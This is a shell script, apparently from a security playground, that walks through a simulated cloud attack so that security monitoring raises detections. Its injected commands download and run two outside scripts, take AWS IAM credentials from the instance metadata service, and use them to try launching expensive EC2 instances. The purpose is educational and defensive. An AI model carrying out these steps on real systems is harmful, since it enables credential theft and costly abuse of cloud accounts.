#!/usr/bin/sh

# Source the helper functions
. "$(dirname "$0")/../../scripts/tool.sh"

# Parse command line arguments
parse_args "$@"

print <<EOF
\033[1;37m# Educational Security Simulation - Cloud Access Attack\033[0m

\033[1;33m⚠️  WARNING: This is a SIMULATION for demonstration purposes only! ⚠️\033[0m

${PURPLE}This demonstration simulates cloud credential theft and resource abuse. \
The attack retrieves AWS credentials from the Instance Metadata Service (IMDS) \
and attempts to use those credentials to launch expensive EC2 instances across \
multiple regions. This showcases how attackers pivot from workload compromise \
to cloud infrastructure abuse.\033[0m
EOF

step <<EOF
\033[1;35mTool Installation - Install Required Utilities\033[0m

${PURPLE}First, we need to ensure curl, jq, and the AWS CLI are available on the \
target system. These tools are required by the cloud-access script to interact \
with the Instance Metadata Service and AWS APIs.\033[0m
EOF
wait_for_confirmation
inject "apt update && apt install -y curl jq awscli"

step <<EOF
\033[1;35mDownload Cloud Access Scripts\033[0m

${PURPLE}Download the two scripts that carry out the attack. The first retrieves \
AWS credentials from the Instance Metadata Service (IMDS); the second uses those \
stolen credentials to attempt launching expensive EC2 instances across multiple \
regions. Splitting the attack this way mirrors how attackers first harvest \
credentials, then pivot to cloud resource abuse.\033[0m
EOF
wait_for_confirmation
# The GIT_SHA environment variable is set at container build time in app/Dockerfile
inject "curl -O https://raw.githubusercontent.com/DataDog/datadog-security-playground/${GIT_SHA}/assets/cloud-access/retrieve-creds-via-imds.sh -O https://raw.githubusercontent.com/DataDog/datadog-security-playground/${GIT_SHA}/assets/cloud-access/run-instances-with-creds.sh"

step <<EOF
\033[1;35mMake Cloud Access Scripts Executable\033[0m

${PURPLE}Set execution permissions on both cloud access scripts.\033[0m
EOF
wait_for_confirmation
inject "chmod +x retrieve-creds-via-imds.sh run-instances-with-creds.sh"

step <<EOF
\033[1;35mCredential Theft - Retrieve AWS Credentials via IMDS\033[0m

${PURPLE}Now we execute the first script, which retrieves credentials from the \
Instance Metadata Service (IMDS). It tries both IMDSv2 and IMDSv1 to obtain the \
node's IAM role credentials and stages them in a temporary file for the next \
step. The raw IMDS requests are visible to runtime security monitoring.\033[0m
EOF
wait_for_confirmation
inject "./retrieve-creds-via-imds.sh"

step <<EOF
\033[1;35mCloud Resource Abuse - Attempt EC2 Instance Launch\033[0m

${PURPLE}Now we execute the second script, which uses the stolen credentials to \
attempt (and fail) launching expensive EC2 instances across multiple regions, \
generating CloudTrail events that can be investigated.\033[0m
EOF
wait_for_confirmation
inject "./run-instances-with-creds.sh"

step <<EOF
\033[1;35mCleanup - Remove Cloud Access Artifacts\033[0m

${PURPLE}Remove the cloud access scripts and the staged credentials file to clean \
up after the demonstration.\033[0m
EOF
wait_for_confirmation
inject "rm -f retrieve-creds-via-imds.sh run-instances-with-creds.sh /tmp/.aws-cloud-access-creds 2>/dev/null || true"

print <<EOF
${GREEN}Cloud access demonstration completed successfully! All artifacts have been cleaned up.\033[0m
EOF
